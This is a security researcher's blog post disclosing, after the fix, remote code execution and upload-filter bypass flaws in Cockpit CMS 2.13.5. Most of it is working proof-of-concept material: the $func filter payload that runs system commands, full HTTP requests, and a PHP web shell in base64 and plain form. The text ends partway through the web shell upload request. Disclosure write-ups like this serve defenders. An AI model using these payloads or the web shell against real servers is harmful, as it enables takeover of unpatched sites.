@@ -1,0 +1,809 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Cockpit CMS - Multiple Vulnerabilities // FelSec - Blog</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.160.1">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="FelSec" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://felsec.com/css/main.min.f6361b42d404a23cafcf1b9a8cab08905c6731c6a4a64ef829e96f416baf2537.css" />
+    <link rel="stylesheet" href="/css/code.css" />
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Cockpit CMS - Multiple Vulnerabilities">
+  <meta name="twitter:description" content="Multiple vulnerabilities identified in Cockpit CMS version 2.13.5">
+
+    <meta property="og:url" content="https://felsec.com/posts/cockpit-cms-2.13.5-multi-vulns/">
+  <meta property="og:site_name" content="FelSec - Blog">
+  <meta property="og:title" content="Cockpit CMS - Multiple Vulnerabilities">
+  <meta property="og:description" content="Multiple vulnerabilities identified in Cockpit CMS version 2.13.5">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-04-29T10:00:37+01:00">
+    <meta property="article:modified_time" content="2026-04-29T10:00:37+01:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://felsec.com/"><img class="app-header-avatar" src="/avatar.png" alt="FelSec" /></a>
+      <h1>FelSec - Blog</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/posts/">Posts</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Penetration Tester &amp; Security Researcher</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/felsec" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://bsky.app/profile/felsec.bsky.social" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Cockpit CMS - Multiple Vulnerabilities</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 29, 2026
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          15 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="multiple-vulnerabilities-in-cockpit-cms--version-2135">Multiple Vulnerabilities in Cockpit CMS &lt;= Version 2.13.5</h1>
+<h2 id="disclosure-timeline">Disclosure Timeline</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Date</th>
+          <th>Event</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>13th March 2026</td>
+          <td>Reported the Arbitrary Code Execution vulnerability to Cockpit CMS</td>
+      </tr>
+      <tr>
+          <td>14th March 2026</td>
+          <td>Patch created and pushed to the develop branch</td>
+      </tr>
+      <tr>
+          <td>25th March 2026</td>
+          <td>Reported the Arbitrary File Write and Directory Traversal vulnerabilities to Cockpit CMS</td>
+      </tr>
+      <tr>
+          <td>25th March 2026</td>
+          <td>Patch created and pushed to the develop branch</td>
+      </tr>
+      <tr>
+          <td>30th March 2026</td>
+          <td>Cockpit CMS version 2.14.0 released with the patches</td>
+      </tr>
+      <tr>
+          <td>29th April 2026</td>
+          <td>Vulnerability write up was released</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="acknowledgements">Acknowledgements</h2>
+<p>I just want to give huge kudos to Artur for responding quickly and patching these vulnerabilities. For each of the issues I reported, he released a patch within 7 hours which is impressive!</p>
+<h2 id="overview">Overview</h2>
+<p>After testing a few open-source CMS projects as part of pen tests for work, and finding a few vulnerabilities, I decided to take a look at some other open-source CMS projects to see what else could be found. In my search I can across Cockpit CMS, a PHP-based headless CMS, where I found a rather nice bunch of issues.</p>
+<p>But first off, what is Cockpit CMS?</p>
+<p>Cockpit CMS is a modern, open-source headless content management system built with PHP that focuses on flexibility and developer control. Unlike traditional CMS platforms that lock you into a specific frontend, Cockpit acts purely as a content backend, exposing data through REST and GraphQL APIs.</p>
+<h2 id="vulnerability-1---arbitrary-code-execution-via-filter-parameter">Vulnerability 1 - Arbitrary Code Execution via <code>filter</code> Parameter</h2>
+<p>Before digging into the source code and setting up my own instance of Cockpit CMS, I did some searching for write ups of previous vulnerabilities and it was during this research I came across a post by PT SWARM (<a href="https://swarm.ptsecurity.com/rce-cockpit-cms/">https://swarm.ptsecurity.com/rce-cockpit-cms/</a>). Reading through, it gave me an idea as to where to start looking, specifically the <code>$func</code> operator within the Mongolite library used by the application.</p>
+<p>This non-standard operator takes a function name as its value (<code>$conditionValue</code>) and calls it parsing in a single parameter (<code>fieldValue</code>).</p>
+<pre tabindex="0"><code>            case &#39;$func&#39;:
+            case &#39;$fn&#39;:
+            case &#39;$f&#39;:
+                if (!\is_callable($conditionValue)) {
+                    throw new \InvalidArgumentException(&#39;Invalid argument for &#39; . $operator . &#39;: function expected&#39;);
+                }
+                return (bool)$conditionValue($fieldValue);
+</code></pre><p>In the article they used this operator to call the PHP function <code>var_dump</code> to leak information from the backend, but my thoughts immediately turned to:</p>
+<p>&ldquo;Can I run system commands?&rdquo;</p>
+<p>In short, yes! The <code>system</code> function was supported, but to use it I needed to inject valid commands into parts of the application that could then be passed to the function call.</p>
+<p>After reviewing the API documentation and playing around with the application some more, I found that several endpoints contained a parameter called <code>filter</code>. This parameter was designed to, for lack of a better word, filter the items returned by the CMS using a given set of conditions. Looking at the source code these conditions allowed you to specify various operators including <code>$func</code>. Result!</p>
+<p>The list of endpoints included:</p>
+<ul>
+<li><code>/api/content/items/&lt;model&gt;</code></li>
+<li><code>/api/conent/items</code></li>
+<li><code>/content/collection/find/&lt;model&gt;</code></li>
+<li><code>/assets/assets</code></li>
+<li><code>/system/logs/load</code></li>
+</ul>
+<p>The next step was to create a payload that would run the <code>system</code> function, luckily this was pretty easy:</p>
+<pre tabindex="0"><code>&#34;filter&#34;:[&#34;{\&#34;&lt;field&gt;\&#34;:{\&#34;$func\&#34;:\&#34;system\&#34;}}&#34;]
+</code></pre><p>For each endpoint the <code>&lt;field&gt;</code> value could be replaced by a field in the resulting object, where we placed the commands to be run. Luckily there were lots of locations that could be used, such as:</p>
+<ul>
+<li>asset titles</li>
+<li>asset descriptions</li>
+<li>asset tags</li>
+<li>collection contents</li>
+</ul>
+<p>So, by creating or modifying assets or collection items and then using the <code>filter</code> parameter it is possible to run arbitrary system commands on the web host with the privileges of the service.</p>
+<h3 id="initial-proof-of-concept">Initial Proof of Concept</h3>
+<p>For the initial proof of concept I attempted to see if it was possible to create a file on the server. I created a new collection with the model name of <code>rce</code> with a simple text field called <code>cmd</code>. Not original but keeping it simple.</p>
+<p>I then created a new item within the collection and set the <code>cmd</code> text to <code>echo 'arbitrary code execution confirmed' &gt; vulnerable.txt</code>.</p>
+<p><strong>Request - Creating the test command</strong></p>
+<pre tabindex="0"><code>POST /content/models/saveItem/rce HTTP/1.1
+Host: 192.168.1.210:9081
+Content-Length: 234
+X-CSRF-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc3JmIjoiYXBwLmNzcmYuYmI1OTIzZDM1YzE3NGVhNmU3MjE1NDk2MjhhZDEzYzVmMDFhNTg3YTE4NDEyOWRiMGVhYjUwMzZkNjZiYzQzOCJ9.kEmi-eZ2xCGCxVE4d9sKB29hVmWYKQNDP-X7wuq2n_8
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-GB,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Origin: http://192.168.1.210:9081
+Referer: http://192.168.1.210:9081/content/collection/item/rce/69b3f8f3eaeac0b3e1085fc0
+Accept-Encoding: gzip, deflate, br
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=10c8a52b0b5e24711fd600f02feeb401
+Connection: keep-alive
+
+{&#34;item&#34;:{&#34;cmd&#34;:&#34;echo &#39;arbitrary code execution confirmed&#39; &gt; vulnerable.txt&#34;,[...SNIPPED...],&#34;_state&#34;:1,&#34;_cby&#34;:&#34;69b1d9c77196bcf22b0e3f03&#34;,&#34;_id&#34;:&#34;69b3f8f3eaeac0b3e1085fc0&#34;}}
+</code></pre><p><strong>Response - Creating the test command</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Type: application/json
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: FrankenPHP Caddy
+X-Frame-Options: SAMEORIGIN
+Content-Length: 225
+
+{&#34;cmd&#34;:&#34;echo &#39;arbitrary code execution confirmed&#39; &gt; vulnerable.txt&#34;,[...SNIPPED...],&#34;_state&#34;:1,&#34;_cby&#34;:&#34;69b1d9c77196bcf22b0e3f03&#34;,&#34;_id&#34;:&#34;69b3f8f3eaeac0b3e1085fc0&#34;}
+</code></pre><p>Next, I attempted to execute the command using the <code>filter</code> parameter.</p>
+<p><strong>Request - Executing the payload</strong></p>
+<pre tabindex="0"><code>POST /content/collection/find/rce HTTP/1.1
+Host: 192.168.1.210:9081
+Content-Length: 126
+X-CSRF-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc3JmIjoiYXBwLmNzcmYuYmI1OTIzZDM1YzE3NGVhNmU3MjE1NDk2MjhhZDEzYzVmMDFhNTg3YTE4NDEyOWRiMGVhYjUwMzZkNjZiYzQzOCJ9.kEmi-eZ2xCGCxVE4d9sKB29hVmWYKQNDP-X7wuq2n_8
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-GB,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Origin: http://192.168.1.210:9081
+Referer: http://192.168.1.210:9081/content/collection/items/rce?state=eyJwYWdlIjoxLCJmaWx0ZXIiOiJ7XCJjbWRcIjp7XCIkZnVuY1wiOlwic3lzdGVtXCJ9fSIsInNvcnQiOnsiX2NyZWF0ZWQiOi0xfSwic3RhdGUiOm51bGwsImxpbWl0IjoyNSwidmlldyI6bnVsbH0=
+Accept-Encoding: gzip, deflate, br
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=10c8a52b0b5e24711fd600f02feeb401
+Connection: keep-alive
+
+{&#34;options&#34;:{&#34;limit&#34;:25,&#34;skip&#34;:0,&#34;sort&#34;:{&#34;_created&#34;:-1},&#34;filter&#34;:&#34;{\&#34;cmd\&#34;:{\&#34;$func\&#34;:\&#34;system\&#34;}}&#34;},&#34;process&#34;:{},&#34;state&#34;:null}
+</code></pre><p><strong>Response - Executing the payload</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Type: application/json
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: FrankenPHP Caddy
+X-Frame-Options: SAMEORIGIN
+Content-Length: 41
+
+{&#34;items&#34;:[],&#34;count&#34;:0,&#34;pages&#34;:0,&#34;page&#34;:1}
+</code></pre><p>To see if it worked, I then browsed to <code>/vulnerable.txt</code> and was met with the text response &ldquo;arbitrary code execution confirmed&rdquo;.</p>
+<p><strong>Request - Get <code>/vulnerable.txt</code></strong></p>
+<pre tabindex="0"><code>GET /vulnerable.txt HTTP/1.1
+Host: 192.168.1.210:9081
+Accept-Language: en-GB,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=10c8a52b0b5e24711fd600f02feeb401
+Connection: keep-alive
+</code></pre><p><strong>Response - GET <code>/vulnerable.txt</code></strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Content-Length: 35
+Content-Type: text/plain; charset=utf-8
+Etag: &#34;dh1qjog5931yz&#34;
+Last-Modified: Fri, 13 Mar 2026 14:48:14 GMT
+Server: FrankenPHP Caddy
+Vary: Accept-Encoding
+
+arbitrary code execution confirmed
+</code></pre><p>Command executed successfully!! Now the question was &ldquo;How do I escalate this?!&rdquo;, once again a simple answer a PHP web shell.</p>
+<p>For this new proof of concept I base64 encoded a simple web shell (to make sure I didn&rsquo;t have any issues with character encoding) and updated the previous collection item.</p>
+<p><strong>Base64 Encoded Web Shell</strong></p>
+<pre tabindex="0"><code>PGh0bWw+CjxoZWFkPjx0aXRsZT5GZWxTZWMtU0g8L3RpdGxlPjwvaGVhZD4KICAgICAgICA8Ym9keT4KICAgICAgICA8aDE+RmVsU2VjIC0gU2hlbGw8L2gxPgogICAgICAgICAgICAgICAgPHByZSBzdHlsZT0iZm9udC1mYW1pbHk6IG1vbm9zcGFjZSI+CiBfX19fX19fX19fX19fX19fCjwgRmVsU2VjIC0gU0hFTEwgPgogLS0tLS0tLS0tLS0tLS0tLQogXAogIFwKICAgXAogLF8gICAgIF8KIHxcXywtfi8KIC8gXyAgXyB8ICAgICwtLS4KKCAgQCAgQCApICAgLyAsLScKIFwgIF9UXy8tLl8oICgKIC8gICAgICAgICBgLiBcCnwgICAgICAgICBfICAgfAogXCAsICAvICAgICAgIHwKICB8fCB8LV9fXyAgIC8KICgoXy9gKF9fX18sLScKPC9wcmU+CiA8YnIgLz4KICAgICAgIDxwcmU+VXNhZ2U6IDx0YXJnZXQ+L2ZlbHNlYy1yY2UucGhwP2NtZD1ob3N0bmFtZTwvcHJlPgogICAgICAgPGJyIC8+Cjw/cGhwCgppZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7CiAgICAgICAgZWNobyAiPHByZT4iOwogICAgICAgICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7CiAgICAgICAgc3lzdGVtKCRjbWQpOwogICAgICAgIGVjaG8gIjwvcHJlPiI7CiAgICAgICAgZGllOwp9Cgo/PgogIDwvYm9keT4KPC9odG1sPgo=
+</code></pre><p><strong>New Payload</strong></p>
+<pre tabindex="0"><code>echo &#39;PGh0bWw+CjxoZWFkPjx0aXRsZT5GZWxTZWMtU0g8L3RpdGxlPjwvaGVhZD4KICAgICAgICA8Ym9keT4KICAgICAgICA8aDE+RmVsU2VjIC0gU2hlbGw8L2gxPgogICAgICAgICAgICAgICAgPHByZSBzdHlsZT0iZm9udC1mYW1pbHk6IG1vbm9zcGFjZSI+CiBfX19fX19fX19fX19fX19fCjwgRmVsU2VjIC0gU0hFTEwgPgogLS0tLS0tLS0tLS0tLS0tLQogXAogIFwKICAgXAogLF8gICAgIF8KIHxcXywtfi8KIC8gXyAgXyB8ICAgICwtLS4KKCAgQCAgQCApICAgLyAsLScKIFwgIF9UXy8tLl8oICgKIC8gICAgICAgICBgLiBcCnwgICAgICAgICBfICAgfAogXCAsICAvICAgICAgIHwKICB8fCB8LV9fXyAgIC8KICgoXy9gKF9fX18sLScKPC9wcmU+CiA8YnIgLz4KICAgICAgIDxwcmU+VXNhZ2U6IDx0YXJnZXQ+L2ZlbHNlYy1yY2UucGhwP2NtZD1ob3N0bmFtZTwvcHJlPgogICAgICAgPGJyIC8+Cjw/cGhwCgppZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7CiAgICAgICAgZWNobyAiPHByZT4iOwogICAgICAgICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7CiAgICAgICAgc3lzdGVtKCRjbWQpOwogICAgICAgIGVjaG8gIjwvcHJlPiI7CiAgICAgICAgZGllOwp9Cgo/PgogIDwvYm9keT4KPC9odG1sPgo=&#39; | base64 -d -w0 &gt; felsec-rce.php
+</code></pre><p><strong>Request - Update the collection item</strong></p>
+<pre tabindex="0"><code>POST /content/models/saveItem/rce HTTP/1.1
+Host: 192.168.1.210:9081
+Content-Length: 1052
+X-CSRF-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc3JmIjoiYXBwLmNzcmYuOWM5MDc1MDYxYzY5NTE4NmNlZmNjNzE3OGVmN2M4OTg3OWM1N2NjNzg3MzI3ZDNiYjk0NWMyZmU4Nzc3ZDNmOCJ9.sKgg-uUtN0lGVuFDVWGCQOzKgRqk2L7iRYpxVd1-9UY
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-GB,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Origin: http://192.168.1.210:9081
+Referer: http://192.168.1.210:9081/content/collection/item/rce/69b3f8f3eaeac0b3e1085fc0
+Accept-Encoding: gzip, deflate, br
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=a849fe3316b7b9aba505a634c9e154e5
+Connection: keep-alive
+
+{&#34;item&#34;:{&#34;cmd&#34;:&#34;echo &#39;PGh0bWw+CjxoZWFkPjx0aXRsZT5GZWxTZWMtU0g8L3RpdGxlPjwvaGVhZD4KICAgICAgICA8Ym9keT4KICAgICAgICA8aDE+RmVsU2VjIC0gU2hlbGw8L2gxPgogICAgICAgICAgICAgICAgPHByZSBzdHlsZT0iZm9udC1mYW1pbHk6IG1vbm9zcGFjZSI+CiBfX19fX19fX19fX19fX19fCjwgRmVsU2VjIC0gU0hFTEwgPgogLS0tLS0tLS0tLS0tLS0tLQogXAogIFwKICAgXAogLF8gICAgIF8KIHxcXywtfi8KIC8gXyAgXyB8ICAgICwtLS4KKCAgQCAgQCApICAgLyAsLScKIFwgIF9UXy8tLl8oICgKIC8gICAgICAgICBgLiBcCnwgICAgICAgICBfICAgfAogXCAsICAvICAgICAgIHwKICB8fCB8LV9fXyAgIC8KICgoXy9gKF9fX18sLScKPC9wcmU+CiA8YnIgLz4KICAgICAgIDxwcmU+VXNhZ2U6IDx0YXJnZXQ+L2ZlbHNlYy1yY2UucGhwP2NtZD1ob3N0bmFtZTwvcHJlPgogICAgICAgPGJyIC8+Cjw/cGhwCgppZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7CiAgICAgICAgZWNobyAiPHByZT4iOwogICAgICAgICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7CiAgICAgICAgc3lzdGVtKCRjbWQpOwogICAgICAgIGVjaG8gIjwvcHJlPiI7CiAgICAgICAgZGllOwp9Cgo/PgogIDwvYm9keT4KPC9odG1sPgo=&#39; | base64 -d -w0 &gt; felsec-rce.php&#34;,[...SNIPPED...],&#34;_state&#34;:1,&#34;_cby&#34;:&#34;69b1d9c77196bcf22b0e3f03&#34;,&#34;_id&#34;:&#34;69b3f8f3eaeac0b3e1085fc0&#34;}}
+</code></pre><p><strong>Response - Update the collection item</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Type: application/json
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: FrankenPHP Caddy
+Vary: Accept-Encoding
+X-Frame-Options: SAMEORIGIN
+Content-Length: 1045
+
+{&#34;cmd&#34;:&#34;echo &#39;PGh0bWw+CjxoZWFkPjx0aXRsZT5GZWxTZWMtU0g8L3RpdGxlPjwvaGVhZD4KICAgICAgICA8Ym9keT4KICAgICAgICA8aDE+RmVsU2VjIC0gU2hlbGw8L2gxPgogICAgICAgICAgICAgICAgPHByZSBzdHlsZT0iZm9udC1mYW1pbHk6IG1vbm9zcGFjZSI+CiBfX19fX19fX19fX19fX19fCjwgRmVsU2VjIC0gU0hFTEwgPgogLS0tLS0tLS0tLS0tLS0tLQogXAogIFwKICAgXAogLF8gICAgIF8KIHxcXywtfi8KIC8gXyAgXyB8ICAgICwtLS4KKCAgQCAgQCApICAgLyAsLScKIFwgIF9UXy8tLl8oICgKIC8gICAgICAgICBgLiBcCnwgICAgICAgICBfICAgfAogXCAsICAvICAgICAgIHwKICB8fCB8LV9fXyAgIC8KICgoXy9gKF9fX18sLScKPC9wcmU+CiA8YnIgLz4KICAgICAgIDxwcmU+VXNhZ2U6IDx0YXJnZXQ+L2ZlbHNlYy1yY2UucGhwP2NtZD1ob3N0bmFtZTwvcHJlPgogICAgICAgPGJyIC8+Cjw\/cGhwCgppZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7CiAgICAgICAgZWNobyAiPHByZT4iOwogICAgICAgICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7CiAgICAgICAgc3lzdGVtKCRjbWQpOwogICAgICAgIGVjaG8gIjwvcHJlPiI7CiAgICAgICAgZGllOwp9Cgo\/PgogIDwvYm9keT4KPC9odG1sPgo=&#39; | base64 -d -w0 &gt; felsec-rce.php&#34;,[...SNIPPED...],&#34;_state&#34;:1,&#34;_cby&#34;:&#34;69b1d9c77196bcf22b0e3f03&#34;,&#34;_id&#34;:&#34;69b3f8f3eaeac0b3e1085fc0&#34;}
+</code></pre><p>Triggering the new payload creates the file <code>/felsec-rce.php</code> in the root directory of the web application.</p>
+<p><strong>Request - Triggering the payload</strong></p>
+<pre tabindex="0"><code>POST /content/collection/find/rce HTTP/1.1
+Host: 192.168.1.210:9081
+Content-Length: 93
+X-CSRF-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc3JmIjoiYXBwLmNzcmYuMjNlYjQ3ODljNWVhNzc1YjFjMTE3YTNhYzk5YjQ1ZWQwNDkzYjU4Yzg4MjcwNTU5ODIyNWZhODIwYjA3MzFkMyJ9.9QY5XydchKXSyEuaUnGeY_1UWBWipYp1FfzQs30Rb2I
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-GB,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Origin: http://192.168.1.210:9081
+Referer: http://192.168.1.210:9081/content
+Accept-Encoding: gzip, deflate, br
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=9ef8bf4ba9086c7879c894705d439c21
+Connection: keep-alive
+
+{&#34;options&#34;:{&#34;sort&#34;:{&#34;_modified&#34;:-1},&#34;limit&#34;:1,&#34;filter&#34;:[&#34;{\&#34;cmd\&#34;:{\&#34;$func\&#34;:\&#34;system\&#34;}}&#34;]}}
+</code></pre><p><strong>Response - Triggering the payload</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Type: application/json
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: FrankenPHP Caddy
+X-Frame-Options: SAMEORIGIN
+Content-Length: 41
+
+{&#34;items&#34;:[],&#34;count&#34;:0,&#34;pages&#34;:0,&#34;page&#34;:1}
+</code></pre><p>Browsing to <code>/felsec-rce.php</code>, I now have a web shell on the server!</p>
+<p><img src="/posts/cockpit-cms-multiplevulns/webshell.png" alt="Web shell running the env command"></p>
+<p>Success!</p>
+<h2 id="next-steps">Next Steps</h2>
+<p>After reporting the first vulnerability, I decided to take a look at some of the modules used by the application. One module in particular caught my eye, Buckets. It had some of the same functionality as the Assets and Content modules (uploading and sharing files), but it did not seem to be directly referenced in the application and it did not have the same level of restrictions as the other two. Moreover, it did not implement the same access controls as the other modules allowing any authenticated user to access the functionality.</p>
+<p>This made it a prime target for vulnerabilities.</p>
+<h2 id="vulnerability-2---filter-bypass-to-arbitrary-code-execution">Vulnerability 2 - Filter Bypass to Arbitrary Code Execution</h2>
+<p>The Buckets module implemented checks to prevent the uploading of <code>.php</code> files, mainly using the <code>_isFileTypeAllowed</code> function (below).</p>
+<pre tabindex="0"><code>    protected function _isFileTypeAllowed($file) {
+
+        $allowed = \trim($this-&gt;app-&gt;retrieve(&#39;finder.allowed_uploads&#39;, &#39;*&#39;));
+
+        if (\strtolower(\pathinfo($file, PATHINFO_EXTENSION)) == &#39;php&#39;) {
+            return false;
+        }
+
+        if ($allowed == &#39;*&#39;) {
+            return true;
+        }
+
+        $allowed = \str_replace([&#39; &#39;, &#39;,&#39;], [&#39;&#39;, &#39;|&#39;], \preg_quote(\is_array($allowed) ? \implode(&#39;,&#39;, $allowed) : $allowed));
+
+        return \preg_match(&#34;/\.({$allowed})$/i&#34;, $file);
+    }
+</code></pre><p>This function checks that the extension of the file does not match <code>php</code> and is within allowed file list (if one is set), using the <code>pathinfo</code> function.</p>
+<p>Reviewing the source code I noticed that the <code>rename</code> function, only uses the <code>_isFileTypeAllowed</code> function to validate the new file name.</p>
+<pre tabindex="0"><code>    protected function rename() {
+
+        $path = $this-&gt;_getPathParameter();
+
+        if ($path === false) return false;
+
+        $name = $this-&gt;param(&#39;name&#39;, false);
+
+        if ($name &amp;&amp; $this-&gt;_isFileTypeAllowed($name)) {
+
+            $source = $this-&gt;root.&#39;/&#39;.$path;
+            $target = $this-&gt;root.&#39;/&#39;.$name;
+
+            $this-&gt;app-&gt;fileStorage-&gt;move($source, $target);
+        }
+
+        return \json_encode([&#39;success&#39; =&gt; true]);
+    }
+</code></pre><p>Meaning that if we are able to bypass this check, we should be able to rename a file to use the <code>.php</code> extension and gain the ability to run arbitrary commands on the host.</p>
+<p>After some trial and error, a suitable bypass was identified. When renaming files, appending the characters <code>/.</code> causes the <code>pathInfo</code> function to return <code>null</code> (as the function assumes the file path provided has no filename or extension). Since <code>null</code> does not equal <code>php</code> the new filename is marked as allowed and passes the check. The malicious filename is then passed to the <code>move</code> function implemented within the <code>FileStorage</code> component, where the path is normalised removing the trailing <code>/.</code> and allowing the file to be renamed with the <code>.php</code> extension.</p>
+<p>A full walkthrough of the exploit is below.</p>
+<ul>
+<li>Log into the application with any user (even on with &ldquo;read-only&rdquo; type access);</li>
+<li>Upload a malicious file with a supported file extension (<code>.txt</code>);</li>
+</ul>
+<p><strong>Web Shell Payload:</strong></p>
+<pre tabindex="0"><code>&gt; cat felsec-rce.php
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;FelSec-SH&lt;/title&gt;&lt;/head&gt;
+        &lt;body&gt;
+        &lt;h1&gt;FelSec - Shell&lt;/h1&gt;
+                &lt;pre style=&#34;font-family: monospace&#34;&gt;
+ ________________
+&lt; FelSec - SHELL &gt;
+ ----------------
+ \
+  \
+   \
+ ,_     _
+ |\_,-~/
+ / _  _ |    ,--.
+(  @  @ )   / ,-&#39;
+ \  _T_/-._( (
+ /         `. \
+|         _   |
+ \ ,  /       |
+  || |-___   /
+ ((_/`(____,-&#39;
+&lt;/pre&gt;
+ &lt;br /&gt;
+       &lt;pre&gt;Usage: &lt;target&gt;/felsec-rce.php?cmd=hostname&lt;/pre&gt;
+       &lt;br /&gt;
+&lt;?php
+
+if(isset($_REQUEST[&#39;cmd&#39;])){
+        echo &#34;&lt;pre&gt;&#34;;
+        $cmd = ($_REQUEST[&#39;cmd&#39;]);
+        system($cmd);
+        echo &#34;&lt;/pre&gt;&#34;;
+        die;
+}
+
+?&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p><strong>Request - Uploading the web shell:</strong></p>
+<pre tabindex="0"><code>POST /system/buckets/api/default?cmd=upload&amp;path=. HTTP/1.1
+Host: 192.168.1.210:9081
+Content-Length: 854
